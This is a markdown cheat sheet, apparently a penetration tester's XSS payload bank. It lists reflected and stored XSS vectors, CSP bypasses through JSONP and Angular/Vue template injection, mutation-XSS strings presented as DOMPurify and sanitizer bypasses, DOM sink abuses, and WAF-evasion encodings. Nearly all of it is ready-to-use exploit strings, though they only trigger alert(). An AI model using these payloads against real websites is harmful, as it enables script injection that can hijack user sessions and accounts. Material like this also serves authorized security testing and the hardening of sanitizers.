# XSS payload bank (2024-2026 tested)

## Reflected / Stored basics
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<math><mtext></mtext><mi>x</mi><annotation encoding="text/html">alert(1)</annotation></math>

## CSP bypass
- JSONP endpoints with callback param → script-src 'self' allows if JSONP host whitelisted
- Angular (1.x): ng-app + {{constructor.constructor('alert(1)')()}}
- Vue: {{_openBlock.constructor('alert(1)')()}}
- window.name based: <script>eval(name)</script> + set name

## Mutation XSS (mXSS)
- DOMPurify bypass (2024): <math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
- sanitizer bypass via <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>

## DOM sinks
- location.hash → innerHTML: #<img src=x onerror=alert(1)>
- postMessage: event.data → document.write / eval / outerHTML
- document.location/name/opener → eval

## WAF bypass encodings
- <scr<script>ipt>alert(1)</scr</script>ipt>
- %3Cscript%3Ealert(1)%3C%2Fscript%3E (double URL encode)
- &#x3c;img src=x onerror=alert(1)&#x3e; (HTML entities)
- <svg onload=alert(1)// (trailing comment)
- javascript&#58;alert(1) (entity in scheme)
